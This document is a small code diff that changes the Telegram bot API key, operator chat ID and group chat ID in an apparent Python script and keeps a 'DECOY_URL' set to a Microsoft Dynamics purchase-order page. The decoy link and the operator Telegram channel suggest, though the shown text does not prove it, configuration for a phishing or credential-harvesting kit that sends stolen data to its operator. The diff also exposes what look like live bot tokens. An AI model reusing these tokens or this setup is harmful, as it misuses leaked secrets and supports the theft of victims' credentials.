@@ -12,9 +12,9 @@ import random, string
 # -----------------------------------------------------------------------------
 # Configuration – your exact Telegram details
 # -----------------------------------------------------------------------------
-BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
-OPERATOR_CHAT_ID = 5178265082
-GROUP_CHAT_ID = -1003972714956
+BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
+OPERATOR_CHAT_ID =  8269558111
+GROUP_CHAT_ID = -1003919074770
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
